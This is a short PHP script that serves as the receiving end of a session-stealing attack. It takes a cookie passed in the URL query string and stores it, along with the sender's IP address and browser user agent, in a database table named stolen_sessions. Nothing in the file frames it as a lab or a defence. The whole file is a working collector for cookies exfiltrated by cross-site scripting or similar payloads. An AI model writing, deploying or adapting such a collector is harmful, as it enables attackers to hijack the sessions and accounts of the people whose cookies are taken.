<?php
require_once 'db.php';

$cookie = $_GET['cookie'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if ($cookie) {
    $stmt = $db->prepare("INSERT INTO stolen_sessions (cookie, ip, user_agent) VALUES (:cookie, :ip, :ua)");
    $stmt->bindValue(':cookie', $cookie);
    $stmt->bindValue(':ip', $ip);
    $stmt->bindValue(':ua', $userAgent);
    $stmt->execute();
}

echo "OK";
?>